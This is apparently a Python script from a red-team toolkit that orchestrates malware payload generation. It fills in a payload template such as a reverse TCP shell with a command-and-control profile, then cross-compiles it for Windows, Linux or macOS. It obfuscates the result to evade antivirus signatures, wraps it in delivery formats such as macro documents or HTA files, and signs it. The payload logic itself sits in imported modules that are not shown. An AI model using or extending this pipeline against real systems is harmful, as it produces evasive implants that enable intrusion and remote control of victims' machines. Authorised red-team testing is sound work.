# redteam_toolkit/payloads/generators/generate_payload.py

import argparse
import logging
import tempfile
import uuid
from pathlib import Path

from redteam_toolkit.core.cross_platform_compiler import CrossCompiler
from redteam_toolkit.core.signature_evasion import EvasionEngine
from redteam_toolkit.core.delivery_packager import Packager
from redteam_toolkit.core.payload_profiles import PayloadTemplateManager
from redteam_toolkit.core.integrity_signer import BinarySigner
from redteam_toolkit.utils.c2_profile_resolver import C2Resolver

logger = logging.getLogger("PayloadOrchestrator")
logging.basicConfig(level=logging.INFO)

class PayloadOrchestrator:
    def __init__(self):
        self.compiler = CrossCompiler()
        self.evasion = EvasionEngine()
        self.packager = Packager()
        self.template_manager = PayloadTemplateManager()
        self.signer = BinarySigner()
        self.c2_resolver = C2Resolver()

    def generate(self, template: str, platform: str, c2_profile: str, output_dir: Path):
        logger.info(f"Starting payload generation: {template} for {platform} with C2 profile {c2_profile}")

        # Step 1: Resolve template
        source_code = self.template_manager.render_template(template, c2_profile)
        with tempfile.NamedTemporaryFile(suffix=".c", delete=False) as temp_source:
            temp_source.write(source_code.encode())
            temp_source_path = Path(temp_source.name)

        # Step 2: Compile
        compiled_payload = output_dir / f"{template}_{platform}_{uuid.uuid4().hex}.bin"
        self.compiler.compile(platform, temp_source_path, compiled_payload)

        # Step 3: Signature evasion
        self.evasion.obfuscate(compiled_payload)

        # Step 4: Package for delivery (e.g., .docm, .hta, shellcode wrapper)
        packaged_payload = self.packager.wrap_payload(compiled_payload, platform)

        # Step 5: Sign final artifact
        self.signer.sign(packaged_payload)

        logger.info(f"Payload successfully generated: {packaged_payload}")
        return packaged_payload

def parse_args():
    parser = argparse.ArgumentParser(description="RedTeam Payload Generator")
    parser.add_argument("--template", required=True, help="Payload template name (e.g., reverse_tcp)")
    parser.add_argument("--platform", required=True, choices=["windows", "linux", "macos"], help="Target platform")
    parser.add_argument("--c2", required=True, help="C2 profile name (e.g., beacon_tcp)")
    parser.add_argument("--output", required=False, default="dist/payloads", help="Output directory for payloads")
    return parser.parse_args()

def main():
    args = parse_args()
    orchestrator = PayloadOrchestrator()
    output_dir = Path(args.output)
    output_dir.mkdir(parents=True, exist_ok=True)
    orchestrator.generate(args.template, args.platform, args.c2, output_dir)

if __name__ == "__main__":
    main()
